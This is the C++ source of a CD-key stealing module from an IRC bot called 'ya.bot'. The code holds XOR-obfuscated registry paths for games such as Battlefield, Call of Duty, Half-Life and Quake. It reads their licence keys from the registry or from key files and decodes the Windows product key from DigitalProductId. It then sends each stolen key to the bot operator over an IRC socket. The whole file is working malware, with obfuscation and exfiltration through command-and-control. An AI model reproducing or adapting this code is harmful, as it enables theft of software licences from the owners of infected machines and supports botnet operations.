/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SNAGCDKEYS

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Willem Fourie & Chuck DeLong
//http://geekswithblogs.net/willemf/archive/2006/04/23/76125.aspx
//http://www.chuckdelong.us/MSProdKey.html
//botbotbotbotbotbotbotbotbotbotbotbotbot

char *DecodeProductKey(BYTE *pbyDigitalProductId)
{
	BYTE *pbyPID;
	char *pszKey, rgpszDigits[32];
	int i, j, nDecodedLength, nEncodedLength, nKeyEnd, nKeyStart, nMap, nValue;
	static char s_szKey[32];

#ifndef NO_DEBUG
		debug_print("Decoding Windows CD-Key, DecodeProductKey()");
#endif

		strncpy(rgpszDigits, string_snagcdkeyswincdkeydigits, sizeof(rgpszDigits) - 1);
		nKeyStart = 0x34; //52
		nKeyEnd = nKeyStart + 15;
		nDecodedLength = 29;
		nEncodedLength = 15;
		pszKey = new char[nDecodedLength];
		pbyPID = new BYTE[nDecodedLength];
	for (i = nKeyStart; i <= nKeyEnd; i++)
			pbyPID[i - nKeyStart] = pbyDigitalProductId[i];
	for (i = nDecodedLength - 1; i >= 0; i--)
	{
		if ((i + 1) % 6 == 0)
				pszKey[i] = '-';
		else
		{
				nMap = 0;
			for (j = nEncodedLength - 1; j >= 0; j--)
			{
					nValue = (nMap << 8) | (BYTE)pbyPID[j];
					pbyPID[j] = (BYTE)(nValue / 24);
					nMap = nValue % 24;
			}
				pszKey[i] = rgpszDigits[nMap];
		}
	}
		strncpy(s_szKey, pszKey, sizeof(s_szKey) - 1);
		delete []pszKey;
		delete []pbyPID;
		return s_szKey;
}

void snag_cdkeys(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	SSnagCDKeyList rgSCDKeyList[] =
	{
			//Battlefield 1942
			//SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942\ergc
			//
			{"\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xA0\xAC\xA5\xAD\xE9\xF8\xF0\xFD\xFB",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x8C\xA5\xAC\xAA\xBD\xBB\xA6\xA7\xA0\xAA\xE9\x88"
			"\xBB\xBD\xBA\x95\x8C\x88\xE9\x8E\x88\x84\x8C\x9A\x95\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xA0"
			"\xAC\xA5\xAD\xE9\xF8\xF0\xFD\xFB\x95\xAC\xBB\xAE\xAA",
			"",
			FALSE,
			NULL,
			0},
			//Battlefield 2
			//SOFTWARE\Electronic Arts\EA GAMES\Battlefield 2\ergc
			//
			{"\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xA0\xAC\xA5\xAD\xE9\xFB",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x8C\xA5\xAC\xAA\xBD\xBB\xA6\xA7\xA0\xAA\xE9\x88"
			"\xBB\xBD\xBA\x95\x8C\x88\xE9\x8E\x88\x84\x8C\x9A\x95\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xA0"
			"\xAC\xA5\xAD\xE9\xFB\x95\xAC\xBB\xAE\xAA",
			"",
			FALSE,
			NULL,
			0},
			//Battlefield Vietnam
			//SOFTWARE\Electronic Arts\EA GAMES\Battlefield Vietnam\ergc
			//
			{"\xA5\x86\x93\x93\x8B\x82\x81\x8E\x82\x8B\x83\xC7\xB1\x8E\x82\x93\x89\x86\x8A",
			HKEY_LOCAL_MACHINE,
			"\xB4\xA8\xA1\xB3\xB0\xA6\xB5\xA2\xBB\xA2\x8B\x82\x84\x93\x95\x88\x89\x8E\x84\xC7\xA6"
			"\x95\x93\x94\xBB\xA2\xA6\xC7\xA0\xA6\xAA\xA2\xB4\xBB\xA5\x86\x93\x93\x8B\x82\x81\x8E"
			"\x82\x8B\x83\xC7\xB1\x8E\x82\x93\x89\x86\x8A\xBB\x82\x95\x80\x84",
			"",
			FALSE,
			NULL,
			0},
			//Call Of Duty
			//SOFTWARE\Activision\Call Of Duty
			//InstallPath
			//Main\codkey
			{"\x8A\xA8\xA5\xA5\xE9\x86\xAF\xE9\x8D\xBC\xBD\xB0",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x88\xAA\xBD\xA0\xBF\xA0\xBA\xA0\xA6\xA7\x95\x8A"
			"\xA8\xA5\xA5\xE9\x86\xAF\xE9\x8D\xBC\xBD\xB0",
			"\x80\xA7\xBA\xBD\xA8\xA5\xA5\x99\xA8\xBD\xA1",
			TRUE,
			"\x84\xA8\xA0\xA7\x95\xAA\xA6\xAD\xA2\xAC\xB0",
			20},
			//Call Of Duty 2
			//SOFTWARE\Activision\Call Of Duty 2
			//codkey
			{"\x8A\xA8\xA5\xA5\xE9\x86\xAF\xE9\x8D\xBC\xBD\xB0\xE9\xFB",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x88\xAA\xBD\xA0\xBF\xA0\xBA\xA0\xA6\xA7\x95\x8A"
			"\xA8\xA5\xA5\xE9\x86\xAF\xE9\x8D\xBC\xBD\xB0\xE9\xFB",
			"\xAA\xA6\xAD\xA2\xAC\xB0",
			FALSE,
			NULL,
			0},
			//Command and Conquer: Generals
			//SOFTWARE\Electronic Arts\EA GAMES\Generals\ergc
			//
			{"\x8A\xA6\xA4\xA4\xA8\xA7\xAD\xE9\xA8\xA7\xAD\xE9\x8A\xA6\xA7\xB8\xBC\xAC\xBB\xF3\xE9"
			"\x8E\xAC\xA7\xAC\xBB\xA8\xA5\xBA",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x8C\xA5\xAC\xAA\xBD\xBB\xA6\xA7\xA0\xAA\xE9\x88"
			"\xBB\xBD\xBA\x95\x8C\x88\xE9\x8E\x88\x84\x8C\x9A\x95\x8E\xAC\xA7\xAC\xBB\xA8\xA5\xBA"
			"\x95\xAC\xBB\xAE\xAA",
			"",
			FALSE,
			NULL,
			0},
			//Counter-Strike
			//Software\Valve\CounterStrike\Settings
			//Key
			{"\x8A\xA6\xBC\xA7\xBD\xAC\xBB\xE4\x9A\xBD\xBB\xA0\xA2\xAC",
			HKEY_CURRENT_USER,
			"\x9A\xA6\xAF\xBD\xBE\xA8\xBB\xAC\x95\x9F\xA8\xA5\xBF\xAC\x95\x8A\xA6\xBC\xA7\xBD\xAC"
			"\xBB\x9A\xBD\xBB\xA0\xA2\xAC\x95\x9A\xAC\xBD\xBD\xA0\xA7\xAE\xBA",
			"\x82\xAC\xB0",
			FALSE,
			NULL,
			0},
			//Half-Life
			//Software\Valve\Half-Life\Settings
			//Key
			{"\x81\xA8\xA5\xAF\xE4\x85\xA0\xAF\xAC",
			HKEY_CURRENT_USER,
			"\x9A\xA6\xAF\xBD\xBE\xA8\xBB\xAC\x95\x9F\xA8\xA5\xBF\xAC\x95\x81\xA8\xA5\xAF\xE4\x85"
			"\xA0\xAF\xAC\x95\x9A\xAC\xBD\xBD\xA0\xA7\xAE\xBA",
			"\x82\xAC\xB0",
			FALSE,
			NULL,
			0},
			//Medal of Honor: Allied Assault
			//SOFTWARE\Electronic Arts\EA GAMES\Medal of Honor Allied Assault\ergc
			//
			{"\xAA\x82\x83\x86\x8B\xC7\x88\x81\xC7\xAF\x88\x89\x88\x95\xDD\xC7\xA6\x8B\x8B\x8E\x82"
			"\x83\xC7\xA6\x94\x94\x86\x92\x8B\x93",
			HKEY_LOCAL_MACHINE,
			"\xB4\xA8\xA1\xB3\xB0\xA6\xB5\xA2\xBB\xA2\x8B\x82\x84\x93\x95\x88\x89\x8E\x84\xC7\xA6"
			"\x95\x93\x94\xBB\xA2\xA6\xC7\xA0\xA6\xAA\xA2\xB4\xBB\xAA\x82\x83\x86\x8B\xC7\x88\x81"
			"\xC7\xAF\x88\x89\x88\x95\xC7\xA6\x8B\x8B\x8E\x82\x83\xC7\xA6\x94\x94\x86\x92\x8B\x93"
			"\xBB\x82\x95\x80\x84",
			"",
			FALSE,
			NULL,
			0},
			//Quake 3 Arena
			//SOFTWARE\Id\Quake III Arena
			//INSTALLPATH
			//baseq3\q3key
			{"\x98\xBC\xA8\xA2\xAC\xE9\xFA\xE9\x88\xBB\xAC\xA7\xA8",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x80\xAD\x95\x98\xBC\xA8\xA2\xAC\xE9\x80\x80\x80"
			"\xE9\x88\xBB\xAC\xA7\xA8",
			"\x80\x87\x9A\x9D\x88\x85\x85\x99\x88\x9D\x81",
			TRUE,
			"\xAB\xA8\xBA\xAC\xB8\xFA\x95\xB8\xFA\xA2\xAC\xB0",
			16},
			//Quake 4
			//SOFTWARE\Id\Quake 4
			//InstallPath
			//q4base\quake4key
			{"\x98\xBC\xA8\xA2\xAC\xE9\xFD",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x80\xAD\x95\x98\xBC\xA8\xA2\xAC\xE9\xFD",
			"\x80\xA7\xBA\xBD\xA8\xA5\xA5\x99\xA8\xBD\xA1",
			TRUE,
			"\xB8\xFD\xAB\xA8\xBA\xAC\x95\xB8\xBC\xA8\xA2\xAC\xFD\xA2\xAC\xB0",
			20},
			//Soldier Of Fortune 2: Double Helix
			//SOFTWARE\Activision\Soldier of Fortune II - Double Helix
			//InstallPath
			//base\mp\sof2key
			{"\x9A\xA6\xA5\xAD\xA0\xAC\xBB\xE9\x86\xAF\xE9\x8F\xA6\xBB\xBD\xBC\xA7\xAC\xE9\xFB\xF3"
			"\xE9\x8D\xA6\xBC\xAB\xA5\xAC\xE9\x81\xAC\xA5\xA0\xB1",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x88\xAA\xBD\xA0\xBF\xA0\xBA\xA0\xA6\xA7\x95\x9A"
			"\xA6\xA5\xAD\xA0\xAC\xBB\xE9\xA6\xAF\xE9\x8F\xA6\xBB\xBD\xBC\xA7\xAC\xE9\x80\x80\xE9"
			"\xE4\xE9\x8D\xA6\xBC\xAB\xA5\xAC\xE9\x81\xAC\xA5\xA0\xB1",
			"\x80\xA7\xBA\xBD\xA8\xA5\xA5\x99\xA8\xBD\xA1",
			TRUE,
			"\xAB\xA8\xBA\xAC\x95\xA4\xB9\x95\xBA\xA6\xAF\xFB\xA2\xAC\xB0",
			18},
			//Star Wars: Battlefront 2
			//SOFTWARE\LucasArts\Star Wars Battlefront II\1.0
			//CD Key
			{"\x9A\xBD\xA8\xBB\xE9\x9E\xA8\xBB\xBA\xF3\xE9\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xBB\xA6\xA7"
			"\xBD\xE9\xFB",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x85\xBC\xAA\xA8\xBA\x88\xBB\xBD\xBA\x95\x9A\xBD"
			"\xA8\xBB\xE9\x9E\xA8\xBB\xBA\xE9\x8B\xA8\xBD\xBD\xA5\xAC\xAF\xBB\xA6\xA7\xBD\xE9\x80"
			"\x80\x95\xF8\xE7\xF9",
			"\x8A\x8D\xE9\x82\xAC\xB0",
			FALSE,
			NULL,
			0},
			//Unreal Tournament 2004
			//SOFTWARE\Unreal Technology\Installed Apps\UT2004
			//CDKey
			{"\x9C\xA7\xBB\xAC\xA8\xA5\xE9\x9D\xA6\xBC\xBB\xA7\xA8\xA4\xAC\xA7\xBD\xE9\xFB\xF9\xF9"
			"\xFD",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x9C\xA7\xBB\xAC\xA8\xA5\xE9\x9D\xAC\xAA\xA1\xA7"
			"\xA6\xA5\xA6\xAE\xB0\x95\x80\xA7\xBA\xBD\xA8\xA5\xA5\xAC\xAD\xE9\x88\xB9\xB9\xBA\x95"
			"\x9C\x9D\xFB\xF9\xF9\xFD",
			"\x8A\x8D\x82\xAC\xB0",
			FALSE,
			NULL,
			0},
			//Warhammer 40,000: Dawn Of War
			//SOFTWARE\THQ\Dawn of War
			//CDKEY
			{"\x9E\xA8\xBB\xA1\xA8\xA4\xA4\xAC\xBB\xE9\xFD\xF9\xE5\xF9\xF9\xF9\xF3\xE9\x8D\xA8\xBE"
			"\xA7\xE9\x86\xAF\xE9\x9E\xA8\xBB",
			HKEY_LOCAL_MACHINE,
			"\x9A\x86\x8F\x9D\x9E\x88\x9B\x8C\x95\x9D\x81\x98\x95\x8D\xA8\xBE\xA7\xE9\xA6\xAF\xE9"
			"\x9E\xA8\xBB",
			"\x8A\x8D\x82\x8C\x90",
			FALSE,
			NULL,
			0},
			{NULL, NULL, NULL, NULL, FALSE, NULL, 0}
	};
	char szCDKey[MEDBUF], szCDKeyPath[MAX_PATH];
	DWORD dwRead;
	HANDLE hFile;
	int i;

#ifndef NO_DEBUG
		debug_print("Snagging cdkeys, snag_cdkeys()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagcdkeysgettingcdkeys,
					CBLUE, string_replysnag, CEND, string_replydotbot);
	for (i = 0; i < ARRAYSIZE(rgSCDKeyList); i++)
	{
		if (!rgSCDKeyList[i].m_pszGameName)
				break;
			crypto_xor(rgSCDKeyList[i].m_pszGameName, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszSubKey, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszValueName, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszFilePath, xorkey);
		if (registry_readvalue(rgSCDKeyList[i].m_hKey,
					rgSCDKeyList[i].m_pszSubKey,
					rgSCDKeyList[i].m_pszValueName,
					szCDKey,
					sizeof(szCDKey) - 1))
		{
			if (rgSCDKeyList[i].m_bIsFile == TRUE)
			{
					_snprintf(szCDKeyPath, sizeof(szCDKeyPath) - 1,
							string_filepath,
							szCDKey,
							rgSCDKeyList[i].m_pszFilePath);
					hFile = CreateFile(szCDKeyPath,
							GENERIC_READ,
							FILE_SHARE_READ,
							NULL,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							0);
					memset(szCDKey, 0, sizeof(szCDKey));
				if (hFile != INVALID_HANDLE_VALUE)
						ReadFile(hFile,
								szCDKey,
								(unsigned long)rgSCDKeyList[i].m_nFileKeyLength,
								&dwRead,
								NULL);
					CloseHandle(hFile);
			}
			if (strlen(szCDKey) >= 1)
			{
					Sleep(FLOOD_DELAY);
				if (!bSilent)
						irc_message(bsock, pszAction, pszDestination,
								(char *)string_snagcdkeyscdkey,
								CGREEN, string_replysnag, CEND, string_replydotbot,
								CBLUE, CEND, rgSCDKeyList[i].m_pszGameName,
								CBLUE, CEND, szCDKey);
					Sleep(FLOOD_DELAY);
			}
		}
			crypto_xor(rgSCDKeyList[i].m_pszGameName, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszSubKey, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszValueName, xorkey);
			crypto_xor(rgSCDKeyList[i].m_pszFilePath, xorkey);
	}
		Sleep(FLOOD_DELAY);
		snag_wincdkey(bsock, pszAction, pszDestination, bSilent, bVerbose);
		Sleep(FLOOD_DELAY);
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagendofsnag,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		return;
}

bool snag_wincdkey(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	BYTE byProductId[MEDBUF];
	char szOS[32];
	int nOS;

#ifndef NO_DEBUG
		debug_print("Snagging Windows CD-Key, snag_wincdkey()");
#endif

	if (!registry_readvalue(HKEY_LOCAL_MACHINE,
				(char *)string_snagcdkeyswincdkeyregistrypath,
				(char *)string_snagcdkeyswincdkeyregistryvalue,
				(char *)byProductId,
				sizeof(byProductId))) return FALSE;
			nOS = info_os();
		if (nOS == OS_WINNT)
				strncpy(szOS, string_infowindowsnt, sizeof(szOS) - 1);
		else if (nOS == OS_WIN2000)
				_snprintf(szOS, sizeof(szOS) - 1,
						string_snagcdkeyswincdkeycdkey,
						string_infowindows2000);
		else if (nOS == OS_WINXP)
				_snprintf(szOS, sizeof(szOS) - 1,
						string_snagcdkeyswincdkeycdkey,
						string_infowindowsxp);
		else if (nOS == OS_WIN2003)
				_snprintf(szOS, sizeof(szOS) - 1,
						string_snagcdkeyswincdkeycdkey,
						string_infowindows2003);
		else if (nOS == OS_WINVISTA)
				_snprintf(szOS, sizeof(szOS) - 1,
						string_snagcdkeyswincdkeycdkey,
						string_infowindowsvista);
		else
				_snprintf(szOS, sizeof(szOS) - 1,
						string_snagcdkeyswincdkeycdkey,
						string_infoquestionmarks);
	if (!bSilent)
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagcdkeyscdkey,
					CGREEN, string_replysnag, CEND, string_replydotbot,
					CBLUE, CEND, szOS,
					CBLUE, CEND, DecodeProductKey(byProductId));
		return TRUE;
}
#endif